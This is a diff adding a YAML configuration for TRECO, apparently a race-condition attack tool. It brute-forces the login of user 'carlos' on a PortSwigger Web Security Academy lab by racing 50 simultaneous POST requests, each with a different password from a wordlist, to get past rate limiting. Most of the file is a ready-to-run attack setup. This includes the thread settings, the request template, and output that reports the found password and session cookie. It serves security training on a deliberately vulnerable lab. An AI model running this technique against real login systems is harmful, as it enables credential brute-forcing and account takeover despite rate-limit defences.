@@ -1,0 +1,137 @@
+# ============================================================================
+# TRECO Configuration: PortSwigger Lab 2 - Bypassing Rate Limits
+# ============================================================================
+#
+# Lab URL: https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
+#
+# This lab's login mechanism uses rate limiting to defend against brute-force
+# attacks. However, by sending many login attempts simultaneously using a race
+# condition, you can bypass the rate limit and brute-force the password.
+#
+# Objective: Use race conditions with different passwords per thread to bypass
+# rate limiting and successfully login as carlos.
+#
+# Usage:
+#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
+#   treco examples/portswigger/rate-limit-bypass/attack.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "PortSwigger Lab 2 - Bypassing Rate Limits via Race Conditions"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-362"
+  description: |
+    Exploits race conditions to bypass login rate limiting by sending
+    multiple login attempts with different passwords simultaneously.
+    Each thread tries a different password from a wordlist.
+
+target:
+  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+  http:
+    follow_redirects: false
+  proxy:
+    type: http
+    host: 127.0.0.1
+    port: 8080
+
+entrypoint:
+  state: brute_force_login
+  input:
+    username: "carlos"
+    passwords:
+      source: file
+      path: "builtin:passwords-top-100"
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+  brute_force_login:
+    description: "Bypass rate limit by racing login attempts with different passwords"
+    
+    # This state demonstrates the key feature: input_mode: distribute
+    # Each of the 50 threads will receive a DIFFERENT password from the wordlist
+    race:
+      threads: 50
+      input_mode: distribute  # Each thread gets a unique password
+      sync_mechanism: barrier
+      connection_strategy: preconnect
+      thread_propagation: single
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      username={{ username }}&password={{ input.password }}
+    
+    extract:
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_enter: |
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🔐 PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions            ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Target:   {{ "%-67s" | format(target.host)                               }} ║
+        ║  Username: {{ "%-67s" | format(username)                                  }} ║
+        ║  Strategy: Race 50 login attempts with different passwords simultaneously  ║
+        ║  Mode:     DISTRIBUTE (each thread gets unique password)                   ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        🔍 Loading passwords from built-in wordlist...
+        ⚡ Starting race attack with {{ race.threads }} threads...
+      
+      on_thread_leave: |
+        {% if response.status_code == 302 %}
+        🟢 Thread {{ "%02d" | format(thread.id) }}: SUCCESS! Password found: "{{ input.password }}"
+        {% elif response.status_code == 200 and 'Invalid username or password' in response.text %}
+        🔴 Thread {{ "%02d" | format(thread.id) }}: Failed with "{{ input.password }}"
+        {% elif response.status_code == 429 %}
+        ⚠️  Thread {{ "%02d" | format(thread.id) }}: Rate limited ({{ input.password }})
+        {% else %}
+        ⚪ Thread {{ "%02d" | format(thread.id) }}: Status {{ response.status_code }} ({{ input.password }})
+        {% endif %}
+      
+      on_state_leave: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  📊 RACE ATTACK RESULTS                                                      ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Threads:    {{ race.threads }}                                              ║
+        ║  Successful: {{ brute_force_login | selectattr('status', 'equalto', 302) | list | length }}                                                             ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        {% set successful = brute_force_login | selectattr('status', 'equalto', 302) | list %}
+        {% if successful | length > 0 %}
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🎉 LAB SOLVED!                                                              ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  ✅ Successfully bypassed rate limit and found valid credentials             ║
+        ║  👤 Username: {{ username }}                                                 ║
+        ║  🔑 Password: {{ successful[0].extracted.get('password', 'N/A') }}           ║
+        ║  🍪 Session:  {{ successful[0].session[:20] }}...                            ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        {% else %}
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  ⚠️  NO SUCCESSFUL LOGIN                                                     ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Try:                                                                        ║
+        ║  - Using a different wordlist                                                ║
+        ║  - Increasing thread count                                                   ║
+        ║  - Verifying the username is correct                                         ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        {% endif %}
